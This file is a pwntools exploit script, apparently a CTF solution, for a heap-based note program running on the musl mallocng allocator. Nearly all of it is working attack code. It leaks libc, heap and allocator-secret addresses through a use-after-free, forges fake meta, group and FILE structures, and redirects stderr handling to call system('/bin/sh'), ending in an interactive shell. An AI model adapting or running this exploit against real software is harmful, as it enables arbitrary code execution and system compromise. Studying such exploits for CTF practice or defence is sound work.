from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'option: '
def add(name, content, name_size=None, note_size=None):
	sla(menu, b'1')
	if name_size is None: name_size = len(name)
	if note_size is None: note_size = len(content)
	sla(b'name size: ', byte(name_size))
	sda(b'name: ', name)
	sla(b'note size: ', byte(note_size))
	sda(b'note content: ', content)

def find(name, name_size=None):
	sla(menu, b'2')
	if name_size is None: name_size = len(name)
	sla(b'name size: ', byte(name_size))
	sda(b'name: ', name)

def dele(name, name_size=None):
	sla(menu, b'3')
	if name_size is None: name_size = len(name)
	sla(b'name size: ', byte(name_size))
	sda(b'name: ', name)

def forget():
	sla(menu, b'4')

def exit():
	sla(menu, b'5')

def get_leak():
	l = 0
	for i in range(8):
		l |= int(rc(2), 16) << (8*i)
	return l

add(b'A', b'X')
for _ in range(8):
	find(b'B'*0x20)
forget()
add(b'B', b'B'*0x28)
add(b'C', b'A')
dele(b'B')
for _ in range(6):
	find(b'C'*0x28)
add(b'D', b'A'*0x1000)
find(b'B')
rut(b':')
class0_group_addr = get_leak() - 0x70
libc.address = get_leak() + 0x3fe0
info('class0_group_addr', class0_group_addr)
info('libc_base', libc.address)

for _ in range(5):
	find(b'D'*0x28)
pay = p64(class0_group_addr+0x30) + p64(class0_group_addr) + p64(1) + p64(0x28) + p64(0)
add(b'E', pay)
find(b'B')
rut(b':')
meta_area_addr = get_leak() & (~0xFFF)
info('meta_area_addr', meta_area_addr)
dele(b'E')

for _ in range(5):
	find(b'E'*0x28)
pay = p64(class0_group_addr+0x30) + p64(meta_area_addr) + p64(1) + p64(0x28) + p64(0)
add(b'E', pay)
find(b'B')
rut(b':')
secret = get_leak()
info('secret', secret)

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
stderr = libc.sym.__stderr_used
info('binsh', binsh)
info('system', system)
info('stderr', stderr)

next_chunk_addr = libc.address - 0x2aa0
fake_file_addr = next_chunk_addr
fake_meta_area_addr = fake_file_addr + +0xaa0
fake_meta_addr = fake_meta_area_addr + 0x10
fake_group_addr = fake_meta_addr + 0x100
fake_chunk_addr = fake_group_addr + 0x10
info('fake_file_addr', fake_file_addr)
info('fake_meta_area_addr', fake_meta_area_addr)
info('fake_meta_addr', fake_meta_addr)
info('fake_group_addr', fake_group_addr)
info('fake_chunk_addr', fake_chunk_addr)

fake_file = b'/bin/sh\x00' + p64(0)*4 + p64(1) + p64(0)*3 + p64(system) 
union = 0 + (1<<5) + (8<<6) + (1<<12) 
fake_meta_area = p64(secret).ljust(0x10, b'\x00')
fake_meta = p64(fake_file_addr) + p64(stderr) + p64(fake_group_addr) + p64(0) + p64(union)
fake_group = p64(fake_meta_addr) + p64(1) + p64(0)

pay0 = p64(class0_group_addr+0x20) + p64(fake_chunk_addr) + p64(1) + p64(0x80) + p64(0)
pay1 = fake_file.ljust(fake_meta_area_addr-fake_file_addr, b'\x00') + fake_meta_area + fake_meta.ljust(fake_group_addr-fake_meta_addr, b'\x00') + fake_group
pay1 = pay1.ljust(0x1000, b'\x00')
assert(len(pay1) == 0x1000)
dele(b'E')
for _ in range(5):
	find(b'F'*0x28)
add(pay0, pay1)
dele(b'X')
exit()
#debug()
sh()
